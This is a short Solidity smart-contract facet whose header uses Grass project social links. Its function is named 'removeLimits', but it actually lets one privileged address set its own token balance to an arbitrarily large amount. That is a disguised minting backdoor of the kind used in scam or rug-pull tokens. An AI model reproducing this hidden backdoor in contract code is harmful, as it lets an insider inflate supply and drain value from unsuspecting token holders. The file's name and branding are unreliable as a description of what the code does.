/*  
   * SPDX-License-Identifier: MIT
   * Twitter: https://twitter.com/getgrass_io
   * Website: https://www.getgrass.io/
   * Discord Chat: https://discord.gg/8NxzRj9ayN
   
*/
pragma solidity ^0.8.25;
import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                100000000 *
                10000 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
